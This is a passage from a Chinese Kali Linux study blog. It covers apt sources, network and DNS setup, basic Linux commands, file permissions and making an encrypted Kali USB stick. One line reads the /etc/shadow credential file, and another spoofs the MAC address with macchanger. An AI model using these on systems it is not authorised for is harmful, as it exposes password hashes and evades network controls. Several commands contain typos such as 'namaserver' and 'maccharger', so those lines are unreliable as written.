      <title>kali 更新源</title>
      <link href="/2019/03/20/kali%20%E6%9B%B4%E6%96%B0%E6%BA%90/"/>
      <url>/2019/03/20/kali%20%E6%9B%B4%E6%96%B0%E6%BA%90/</url>
      
        <content type="html"><![CDATA[<blockquote><p>kali源：用于kali更新，也可在ubunto和debian上安装kali工具</p></blockquote><a id="more"></a><p>升级补丁,保持系统最新</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list #修改 更新源 文件</span><br></pre></td></tr></table></figure><p>更新源</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">官方源</span></span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">中科大 Kali源</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">阿里云kali源</span></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali main non-free contrib</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update #更新索引</span><br><span class="line">apt-get upgrade #根据索引，真正更新</span><br></pre></td></tr></table></figure><p>在ubuntu,debian上更换源后，更新索引需要添加秘钥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys 7D8D0BF6</span><br></pre></td></tr></table></figure><p>ok,再更新索引吧！</p>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali之网络配置</title>
      <link href="/2019/03/20/kali%E4%B9%8B%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/"/>
      <url>/2019/03/20/kali%E4%B9%8B%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<blockquote><p>基础配置</p></blockquote><a id="more"></a><h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a><strong>网络配置</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 #查询eth0网卡配置</span><br><span class="line"></span><br><span class="line">dhclient eth0 #向DHCP服务器发送请求自动获得IP地址 </span><br><span class="line"></span><br><span class="line">ifconfig eth0 192.168.1.10/24 #指定获得ip地址</span><br><span class="line"></span><br><span class="line">route add default gw 192.168.1.1 #指定网关</span><br><span class="line"></span><br><span class="line">netstat -nr #查询网关 </span><br><span class="line">route -n</span><br></pre></td></tr></table></figure><p>添加路由,内部网段（网络地址，不是主机地址/32），网关，网卡 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route add -net 192.168.0.0/24 gw 192.168.1.100 eth0</span><br></pre></td></tr></table></figure><p>配置DNS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim etc/resolv.conf</span><br><span class="line">namaserver 8.8.8.8</span><br><span class="line">namaserver 114.114.114.114</span><br><span class="line">或</span><br><span class="line">echo nameserver 192.168.1.1 &gt; /etc/resolv.conf</span><br></pre></td></tr></table></figure><blockquote><p>这些ifconfig分配的IP和DNS在修改后从开机又会返回原值<br>因此可在静态模式下，制定自己的网卡</p></blockquote><p>网卡配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/nerwork/interfaces</span><br></pre></td></tr></table></figure><p>默认为动态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># The loopback network interface</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br></pre></td></tr></table></figure><p>静态为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># The loopback network interface</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static</span><br><span class="line"></span><br><span class="line">address 172.28.34.88 #ip</span><br><span class="line">netmask 255.255.255.192 #子网掩码</span><br><span class="line">gateway 172.28.34.126 #网关</span><br><span class="line">dns-namaservers 192.168.0.10 192.168.0.20 #dns服务器开机自动添加到dns文件内</span><br><span class="line"></span><br><span class="line">#up route add -net 172.168.5.0/24 gw 192.168.10.100 eth1 #开机添加路由配置</span><br><span class="line">#down route del -net 172.168.0.0/24 #关机删除掉路由配置</span><br><span class="line">#下面这两个可以不设置</span><br><span class="line">#network 192.168.20.0 #网络地址</span><br><span class="line">#broadcast 192.168.20.255 #广播地址</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux学习笔记</title>
      <link href="/2019/03/20/linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/03/20/linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>linux基础知识</p></blockquote><a id="more"></a><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p><code>bin</code>  放普通用户也可以使用的命令<br><code>sbin</code>  放管理员才可以执行的命令<br><code>boot</code>  放启动(引导)配置文件<br><code>dev</code>  放存储设备的，例硬盘<br><code>etc</code>  放系统和应用程序的配置文件<br><code>home</code>  普通用户家目录<br><code>lib</code>  放函数库文件<br><code>lib64</code>  放64位函数库文件<br><code>live-build</code>  build自己kali版本<br><code>lost found</code>  出现问题，错误，丢失的文件目录<br><code>media mnt</code>  挂载外来存储介质<br><code>opt</code>  安装外围的大型程序的<br><code>proc</code>  开机生成的配置文件<br><code>root</code>  主目录<br><code>selinux</code>  linux的安全机制<br><code>srv sys tmp</code>  临时目录<br><code>usr</code>  也可安装外围程序<br><code>var</code>  存放经常变化的如日志，邮件的目录</p><h2 id="求助命令"><a href="#求助命令" class="headerlink" title="求助命令"></a>求助命令</h2><h3 id="指令的-–help-求助说明"><a href="#指令的-–help-求助说明" class="headerlink" title="指令的 –help 求助说明"></a>指令的 –help 求助说明</h3><p>几乎linux上指令，在开发的时候，就被开发者将指令的语法与参数写入指令的操作过程中了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls --help</span><br></pre></td></tr></table></figure><p>只能用来查询指令，一般用来做协助查询</p><h3 id="man-page"><a href="#man-page" class="headerlink" title="man page"></a>man page</h3><p>man 是 manual(操作说明)的简写；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man ls</span><br></pre></td></tr></table></figure><p>左上角的【ls(1)】(1)解释如下:</p><table><thead><tr><th>代号</th><th>代表内容</th></tr></thead><tbody><tr><td>1</td><td>用户在shell环境中可以操作的指令或可执行文件</td></tr><tr><td>…</td><td>…</td></tr><tr><td>5</td><td>配置文件或者是某些文件的格式</td></tr><tr><td>…</td><td>…</td></tr><tr><td>8</td><td>系统管理员可使用的管理命令</td></tr><tr><td>…</td><td>…</td></tr></tbody></table><p>man page内大致内容如下(前四个重要)</p><table><thead><tr><th>代号</th><th>内容</th></tr></thead><tbody><tr><td>NAME</td><td>简短的指令，数据名称说明</td></tr><tr><td>SYNOPSIS</td><td>简短的指令下达语法</td></tr><tr><td>DESCRIPTION</td><td>较为完整的说明</td></tr><tr><td>OPTIONS</td><td>针对SYNOPSIS 中，列举出所有可用的选项的说明</td></tr></tbody></table><p>man page 常用按键：</p><table><thead><tr><th>按键</th><th>反应</th></tr></thead><tbody><tr><td>空格键</td><td>向下翻一页</td></tr><tr><td>[Page Down]</td><td>向下翻一页</td></tr><tr><td>[Page Up]</td><td>向上翻一页</td></tr><tr><td>[Home]</td><td>去到第一页</td></tr><tr><td>[End]</td><td>去到最后一页</td></tr><tr><td>/关键字</td><td>向下搜索</td></tr><tr><td>?关键字</td><td>向上搜索</td></tr><tr><td>n,N</td><td>在 ？和 / 的基础上   n向下一个搜索，N反向搜索</td></tr><tr><td>q</td><td>退出</td></tr></tbody></table><p><strong>搜索特定的指令/文件的man page说明文件</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">man -f man#等同 whatis [指令或是数据]（只能root用户使用）</span><br><span class="line">man 1 man</span><br><span class="line">man 7 man</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man -k man  #搜列出所有含有关键字的说明文件，相当于 apropos [指令或是数据] (root用户)</span><br></pre></td></tr></table></figure><h3 id="info-page（kali无info）"><a href="#info-page（kali无info）" class="headerlink" title="info page（kali无info）"></a>info page（kali无info）</h3><p>查询指令和文件的格式，与 man 相似，但是拆分为不同的节点</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info info</span><br></pre></td></tr></table></figure><h3 id="非联网的说明文件"><a href="#非联网的说明文件" class="headerlink" title="非联网的说明文件"></a>非联网的说明文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/doc</span><br></pre></td></tr></table></figure><h2 id="熟悉命令"><a href="#熟悉命令" class="headerlink" title="熟悉命令"></a>熟悉命令</h2><blockquote><p>命令字 [选项] [参数]<br>linux 命令：用于实现某一功能的指令或程序，执行依赖于解释器程序，（/bin/bash）<br>man 指令 #查询指令用法<br>指令 –help #查询指令选项</p></blockquote><p><code>uname</code><br>uname -r    //系统内核<br>uname -a    //系统详细信息<br>which uname    //查看位置</p><p><code>hostnema</code><br>hostname    //主机名</p><p><code>mkdir</code><br>创建目录<br>-p 递归创建</p><p><code>touch</code><br>创建文件</p><p><code>ls</code><br>浏览目录<br>-l 长格式显示文件名，d-目录，-普通文件，c-字符型设备，l-链接文件，b-块设备（sda）f-堆栈文件，p-命令管道。<br>drwxr-xr-x<br>第一个字符后面有三个字符组，分别表示文件拥有者，文件用户组，系统其他用户。<br>-a 多显示出以.命名的隐藏文件<br>-h 显示大小，（3M)<br>-R 递归浏览</p><p>–fulll-time 完整时间</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -lh --sort=size # 以文件大小排序,size可换为time,按时间排</span><br></pre></td></tr></table></figure><p><code>cd</code><br>进入目录<br>. 当前目录<br>.. 这个目录的上个目录</p><p><code>ln</code><br>为文件或目录建立链接（link）<br>-s 建立软链接文件（省略此项则显示硬链接）</p><p><code>cp</code><br>复制<br>-r 递归复制整个目录树<br>-p 保持源文件的属性不变<br>-f 强制覆盖目录目标同名文件或目录<br>-i 需要覆盖文件或目录时进行提醒</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ps ps1 # 拷贝ps 命名为ps1</span><br></pre></td></tr></table></figure><p><code>rm</code><br>-f 强行删除文件或目录，不进行提醒<br>-i 删除文件或目录时提醒用户确定<br>-r 递归删除整个目录树</p><p><code>mv</code><br>移动</p><p><code>pwd</code><br>查看当前的工作目录</p><p><code>cat</code><br>查看文本文件内容，全部显示<br>which cat<br>cat /etc/passwd<br>cat /etc/shadow<br>-n 显示行号</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">date &gt; 1</span><br><span class="line">cat 1 2</span><br><span class="line">cat 1 2 &gt; 3  //合并</span><br></pre></td></tr></table></figure><p><code>more</code><br>按百分比显示文本内容，逐屏显示，enter:查看下一页， q: 退出</p><p><code>less</code><br>不显示百分比，和more 类似，显示目录位置,q退出</p><p><code>tail</code><br>默认显示最后10行<br>-20 显示最后20行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">watch -n 2 tail -20 /var/log/messages # 每隔两秒显示查看日志变化最后20行（实时查看系统日志变化）有的发行版没有messages这个文件。</span><br></pre></td></tr></table></figure><p><code>du</code><br>统计目录及文件的空间占用情况</p><p><code>wc</code><br>统计文件中行数，单词数量，字符数<br>-l 行数<br>-w 单词数<br>-c 字符数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wc 1.txt 会出现2 4 26</span><br><span class="line">2是行数，4是单词数，26是字符数</span><br></pre></td></tr></table></figure><p><code>find</code><br>查找<br>find [查找范围] [查找条件]<br>-name 按文件名称查找<br>-size 按大小查找<br>-user 按文件属主查找<br>-type 按文件类型查找</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /etc -name "resol*.conf"</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -iname namp #从/查找不分大小写的namp</span><br><span class="line">find . -name "ps*" -exec cp &#123;&#125; /tmp//&#123;&#125;.bak \: #从本目录下搜索ps开头的文件，并拷贝到目标目录</span><br></pre></td></tr></table></figure><p><strong>-iname: 不分大小写， -name: 分大小写</strong></p><p><code>whereis</code><br>查找</p><p><strong>如果是源码安装，不是本地包管理安装，会查找不到</strong><br><strong>如果在whereis的数据库里（本地安装回生成一个whereis数据库），比find快</strong><br><strong>updatedb 更新数据库</strong><br><strong>-b 二进制文件</strong></p><p><code>top</code><br>监视系统性能参数</p><p>q退出，输入k 结束某进程</p><p><img src="/images/kali_top_kill.jpg" alt></p><p><code>ps</code><br>显示进程<br>-ef 详细显示<br>aus 显示的列信息稍有不同</p><p><code>grep</code><br>筛选显示的内容<br>配角：<code>cat</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd # 查看操作系统的本地账号</span><br><span class="line">grep ssh /etc/passwd #只显示包含ssh的内容</span><br></pre></td></tr></table></figure><p><code>ifconfig</code><br>配角：<code>maccharger</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 down #down掉eth0,再改Mac地址时，需要先执行这步</span><br><span class="line">maccharger -m 00:11:11:11:11:11 eth0 #改Mac地址</span><br><span class="line">ifconfig eth0 up #up eth0</span><br></pre></td></tr></table></figure><p><strong>修改的Mac只有在本次使用，改过后可能会上不了网，因为无线路由器绑定了mac地址，下次开机会恢复真实值</strong></p><p><code>netstat</code><br>查看网络的连接信息<br>配角： <code>egrep</code> <code>awk</code> <code>cut</code> <code>sort</code> <code>unip</code> <code>&gt;</code> <code>|</code><br>-pantu tu为tcp,udp连接信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -pantu | egrep -v '0.0.0.0|:::' | awk '&#123;print $5&#125;' | egrep 'and|Address' | cut -d ':' -f 1 | sort | uniq &gt; ip</span><br></pre></td></tr></table></figure><blockquote><p>命令行解读:<br>查看tcp,udp连接信息，筛除掉0.0.0.0和:::的信息,只显示第五块（列）,又筛除and和Address, 查看以”:”为界分的第一块，排序，重复只显示一次，最终 <strong>覆盖</strong> 输出到ip内.<br>“&gt;”改为”&gt;&gt;”追加输出到ip内。<br>awk 和 cut 都是对行操作。<br>管道：| 将多个命令在同一行输入，可以协作。</p></blockquote><p><code>mount</code><br>挂载目录操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -o loop klai.iso /media/cdrom #将kali.iso挂载到目标目录下</span><br></pre></td></tr></table></figure><p><code>dmesg</code><br>查看message内容</p><p><code>echo</code><br>在当前窗口显示某些信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo "hello world!"</span><br></pre></td></tr></table></figure><p><code>ping</code><br>-c 次数</p><p><code>cal</code><br>查看日历</p><p><code>date</code><br>查看时间</p><h3 id="压缩-归档"><a href="#压缩-归档" class="headerlink" title="压缩 归档"></a>压缩 归档</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gzip ***.gz </span><br><span class="line">gzip -d ***.gz</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bzip2 ***.gz</span><br><span class="line">bzip2 -d ***.gz</span><br></pre></td></tr></table></figure><p><code>tar</code><br>归档<br>-c 创建归档文件<br>-v 输出详细信息<br>-f 表示使用归档文件<br>-x 解开归档文件<br>-t 列表查看包内的文件（不释放解包）<br>-C 指定释放位置<br>-p 解包时保留原始文件及目录的权限<br>-z/j 调用gzip/bzip2程序 进行解压或压缩 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">归档打包，解包</span></span><br><span class="line">tar -cvf 4.tar 1 2 3 //将文件1 2 3 打包归档为4.tar</span><br><span class="line">tar -xvf 4.tar //解包归档文件4.tar </span><br><span class="line"><span class="meta">#</span><span class="bash">压缩，解压</span></span><br><span class="line">gzip 4.tar 4.tar.gz </span><br><span class="line">tar zxvf 4.tar.gz  //解压</span><br><span class="line"><span class="meta">#</span><span class="bash">压缩，解压</span></span><br><span class="line">bzip2 4.tar 4.tar.bz2</span><br><span class="line">tar jxvf 4.tar.bz2  //解压</span><br></pre></td></tr></table></figure><h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h3><p>；无逻辑关系，顺序执行<br>|    依次执行，每个都执行，前一个的正确输出作后一个的操作对象<br>&amp;   依次执行，每个都执行<br>&amp;&amp; 逻辑与，依次执行，执行成功则下一个，失败则退出<br>||    逻辑或，依次执行，执行成功则退出，失败则下一个</p><h3 id="关机重启"><a href="#关机重启" class="headerlink" title="关机重启"></a>关机重启</h3><p>halt：关机<br>reboot:重启</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">who  查看目前有谁在线</span><br><span class="line">netstat -a #查看联机状态</span><br><span class="line">ps -aus #后台执行的程序</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">指令</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">sync</td><td align="left">数据同步写入磁盘</td></tr><tr><td align="left">shutdown</td><td align="left">常用关机命令</td></tr><tr><td align="left">halt</td><td align="left">关机命令，进入系统停止的模式</td></tr><tr><td align="left">poweroff</td><td align="left">关机命令，进入关机模式，直接关机没有提供电力欧</td></tr><tr><td align="left">reboot</td><td align="left">直接重启</td></tr><tr><td align="left">suspend</td><td align="left">进入休眠模式</td></tr></tbody></table><p><strong>关机指令大同小异，习惯用哪个就用哪个</strong></p><p><code>shutdown</code></p><p>-h 20:35 关机+时间</p><p>-r +30 “the system will reboot” 重启+时间</p><p>-k now “the system will reboot” 警告，但不会真关机，吓唬人的</p><h3 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h3><p><code>rpm</code>红帽的包格式<br><code>apt</code><br><code>yum</code><br><code>dpkg</code></p><h2 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h2><blockquote><p>set mouse-=a  #鼠标右键全部功能开启，可跨文本</p></blockquote><p><strong>命令模式</strong><br>dd    //删除光标行（剪切）<br>ndd    //删除多行， 例2dd<br>u    //撤销<br>p    //（剪切后）粘贴<br>D    //从光标处删除至行尾</p><p>A 行尾<br>I 行首<br>a 光标后<br>i 光标前<br>O 上一行插入<br>o 下一行插入</p><p><strong>插入模式</strong><br>esc返回命令模式</p><p><strong>底行模式</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">: set nu</span><br><span class="line">: wq</span><br><span class="line">: q!</span><br><span class="line">: w</span><br><span class="line">/ 关键字#向下搜索 n 下一个</span><br><span class="line">？关键字#向上搜索</span><br><span class="line">: %s/XX/YY/g#全文替换,XX改为YY,g为不提示</span><br><span class="line">: 1,5s/XX/YY/g#1到5行</span><br><span class="line">: .#重复上一条命令</span><br><span class="line">: u#消上一条命令</span><br></pre></td></tr></table></figure><hr><h2 id="shell快捷键"><a href="#shell快捷键" class="headerlink" title="shell快捷键"></a>shell快捷键</h2><p>ctrl+l:清屏<br>ctrl+u/k:清空至行首/尾<br>:强行换行<br>tab：命令补全,文件补齐<br>Ctrl+c：退出，相当于exit<br>Ctrl+ins：vim模式<strong>复制</strong>，相当于普通模式的 Ctrl+c<br>Shift+ins：vim模式<strong>粘贴</strong>，相当于普通模式的 Ctrl+v<br>Shift+PgUp/PgDn：上下翻页</p><h2 id="改变文件属性与权限"><a href="#改变文件属性与权限" class="headerlink" title="改变文件属性与权限"></a>改变文件属性与权限</h2><p>chgrp ：改变文件所属群组<br>chown ：改变文件拥有者<br>chmod ：改变文件的权限, SUID, SGID, SBIT 等等的特性</p><blockquote><p>chgrp 要被改变的组名必须要在/etc/group 文件内<em>存在</em>才行，否则就会显示错误<br>chown 要注意的是， 用户必须是<em>已经存在</em>系统中的账号，也就是在/etc/passwd 这个文件中有纪录的用户名称才能改变</p></blockquote><h3 id="改变群组"><a href="#改变群组" class="headerlink" title="改变群组"></a>改变群组</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chgrp [-R] 群组名 文件或目录</span><br></pre></td></tr></table></figure><p>选项与参数：<br>-R : 进行递归(recursive)的持续变更，亦即连同次目录下的所有文件、目录都更新成为这个群组之意。常常用在变更某一目录内所有的文件之情况。</p><h3 id="拷贝文件，改变所属："><a href="#拷贝文件，改变所属：" class="headerlink" title="拷贝文件，改变所属："></a>拷贝文件，改变所属：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp .bashrc .bashrc_test</span><br><span class="line">ls -la .bashrc*   #查看到仍然属于root</span><br><span class="line">chown bin .bashrc</span><br></pre></td></tr></table></figure><h3 id="改变权限"><a href="#改变权限" class="headerlink" title="改变权限"></a>改变权限</h3><p><strong>数字类型改变文件权限</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod [-R] xyz 文件或目录</span><br></pre></td></tr></table></figure><p>选项与参数：<br>xyz : 就是刚刚提到的数字类型的权限属性，为 rwx 属性数值的相加。<strong>r:4,w:2,x:1</strong><br>-R : 进行递归(recursive)的持续变更，亦即连同次<em>目录</em>下的所有文件都会变更</p><p>每种身份(owner/group/others)各自的三个权限(r/w/x)分数是需要累加的，例如当权限为： [-rwxrwx—] 分数<br>则是：<br>owner = rwx = 4+2+1 = 7<br>group = rwx = 4+2+1 = 7<br>others= — = 0+0+0 = 0<br>所以等一下我们设定权限的变更时，该文件的权限数字就是 770 啦！<br>变更权限的指令 chmod 的语法是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod [-R] 770 文件或目录</span><br></pre></td></tr></table></figure><p><strong>符号类型改变文件权限</strong><br>u:user,g:grope,e:others,a:all<br>+:加入，-：除去，=：设定</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod u=rwx,go=rx .bashrc #注意喔！那个 u=rwx,go=rx 是连在一起的，中间并没有任何空格符！</span><br><span class="line">chmod a+w .bashrc  #全部加写权限</span><br><span class="line">ls -al .bashrc</span><br></pre></td></tr></table></figure><blockquote><p>对于文件的 rwx 来说， 主要都是针对『文件的内容』而言，与文件档名的存在与否没有关系喔！因为文件记录的是实际的数据嘛</p></blockquote><p>组件 内容          迭代物件      r            w             x<br>文件 <em>详细资料data</em>  文件文件夹  读到文件内容 修改文件内容  执行文件内容<br>目录 <em>档名</em>          可分类抽屉  读到档名     修改档名      进入该目录的权限(key)</p><h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br></pre></td></tr></table></figure><p>添加环境变量,将root目录添加到PATH中，可以在任何目录下，执行root目录下的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PATH=“$&#123;PATH&#125;:/root”</span><br></pre></td></tr></table></figure><p>tmp是任何用户都能访问的目录，若将.目录加入到PATH中，则会变得很危险。</p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> shell命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在usb上安装kali</title>
      <link href="/2019/02/15/%E5%9C%A8usb%E4%B8%8A%E5%AE%89%E8%A3%85kali/"/>
      <url>/2019/02/15/%E5%9C%A8usb%E4%B8%8A%E5%AE%89%E8%A3%85kali/</url>
      
        <content type="html"><![CDATA[<blockquote><p>持久加密的usb系统</p></blockquote><a id="more"></a><h2 id="在usb上安装kali"><a href="#在usb上安装kali" class="headerlink" title="在usb上安装kali"></a>在usb上安装kali</h2><table><thead><tr><th>kali安装位置</th><th>反馈</th></tr></thead><tbody><tr><td>SD卡</td><td>kali的armel版本：刻录到sd卡上，启动像树莓这样的单板设备</td></tr><tr><td>USB</td><td>持久加密的usb系统</td></tr><tr><td>docker</td><td></td></tr><tr><td>主机</td><td>kali Linux 系统的主机</td></tr><tr><td>虚拟机</td><td></td></tr></tbody></table><h3 id="验证哈希值"><a href="#验证哈希值" class="headerlink" title="验证哈希值"></a>验证哈希值</h3><p><code>git bash here</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha256sum &lt;file&gt; # &lt;file&gt;: 文件名， sha256sum：可换为cksum, md5sum, sha1sum</span><br></pre></td></tr></table></figure><p><code>cmd / powershell</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CertUtil -hashfile &lt;file&gt; MD5 # MD5：可换为sha1,sha256</span><br></pre></td></tr></table></figure><p><strong>对比：</strong><br>cmd -&gt; type &lt;下载的.sha256sum 文件&gt; 或 对比已给的哈希值</p><h3 id="持久加密Usb安装（基于Live）"><a href="#持久加密Usb安装（基于Live）" class="headerlink" title="持久加密Usb安装（基于Live）"></a>持久加密Usb安装（基于Live）</h3><blockquote><ul><li>技术依赖<br>LUKS：linux Unified Key Setup 磁盘分区加密规范（文件被放在加密的分区内）<br>不依赖于操作系统的磁盘级加密<br>后端：dm-crypt（组件）<br>前端：cryptsetup（命令行工具）<br>Windows：DoxBox（组件），可以查看LUKS加密的分区<br>微软的bitlocker，磁盘级加密</li></ul></blockquote><p><code>windows</code>系统下，直接用unetbootin刻录，成功做成usb启动盘，然后做kali linux 的 Live 